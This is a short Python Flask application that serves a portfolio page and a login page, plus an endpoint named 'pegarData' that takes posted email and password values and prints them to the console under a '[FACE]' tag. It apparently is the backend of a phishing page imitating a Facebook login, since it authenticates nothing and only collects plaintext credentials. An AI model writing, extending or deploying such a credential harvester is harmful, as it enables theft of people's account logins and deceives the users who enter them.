from flask import Flask, render_template, jsonify, request




app = Flask(__name__)



@app.route("/")
def index():
    return render_template("portfolio.html")



@app.route("/login")
def login():
    return render_template("login.html")




@app.route("/pegarData", methods=["POST"])
def pegarData():
    data = request.get_json()  # RECEBE JSON

    email = data.get("email")
    passwd = data.get("passwd")

    print(f"[FACE] {email} {passwd}")

    return jsonify({"":""})



if __name__ == "__main__":
    app.run(debug=True)